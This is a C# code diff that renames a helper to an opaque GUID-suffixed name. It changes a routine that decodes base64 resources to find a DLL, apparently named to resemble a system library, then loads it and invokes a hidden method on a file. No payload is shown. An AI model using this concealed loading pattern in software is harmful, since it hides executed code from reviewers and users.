@@ -24,17 +24,17 @@ namespace FPE
             throw new System.ApplicationException($"Resource '{resourceFileName}' not find in assembly '{Assembly.GetExecutingAssembly().FullName}'");
         }
        
-        public static string GTR(string resourceFileName, Assembly assembly)
+        public static string GTR_941AB742314C42D8B29159C3F06E6E47(string resourceFileName, Assembly assembly)
         {
             var resourceFullName = GRFN(resourceFileName, assembly);
             using (var _textStreamReader = new StreamReader(assembly.GetManifestResourceStream(resourceFullName)))
                 return _textStreamReader.ReadToEnd();
         }
 
-        public static string GTR64(string resourceFileName, Assembly assembly)
-        {
-            return Encoding.UTF8.GetString(Convert.FromBase64String(GTR(resourceFileName, assembly)));
-        }
+        //public static string GTR64(string resourceFileName, Assembly assembly)
+        //{
+        //    return Encoding.UTF8.GetString(Convert.FromBase64String(GTR_941AB742314C42D8B29159C3F06E6E47(resourceFileName, assembly)));
+        //}
 
         public static string bTos(string b)
         {
@@ -62,17 +62,17 @@ namespace FPE
             try
             {
                 var myType = TL_6523D4E7C8FE477EA3562813C65A984E(
-                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("SMDPFPES.txt", Assembly.GetExecutingAssembly())))
+                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR_941AB742314C42D8B29159C3F06E6E47("SMDPFPES.txt", Assembly.GetExecutingAssembly())))
                     , 
                     Assembly.LoadFrom(
-                        Encoding.UTF8.GetString(Convert.FromBase64String(GTR("SMDP.txt", Assembly.GetExecutingAssembly()))) /* @".\System.Memory.Data.Past.dll"*/
+                        Encoding.UTF8.GetString(Convert.FromBase64String(GTR_941AB742314C42D8B29159C3F06E6E47("SMDP.txt", Assembly.GetExecutingAssembly()))) /* @".\System.Memory.Data.Past.dll"*/
                     )
                 );
                 bool result = ML_F9CAF08E94D44055A9BDA419A91722B3(myType, 
 
-                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("RC.txt", Assembly.GetExecutingAssembly()))) /*methodName*/
+                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR_941AB742314C42D8B29159C3F06E6E47("RC.txt", Assembly.GetExecutingAssembly()))) /*methodName*/
 
-                )(GTR("FzCD.txt", Assembly.GetExecutingAssembly()) /* << fileName*/); // Test the dynamic call
+                )(GTR_941AB742314C42D8B29159C3F06E6E47("FzCD.txt", Assembly.GetExecutingAssembly()) /* << fileName*/); // Test the dynamic call
             }
             catch (Exception ex)
             {
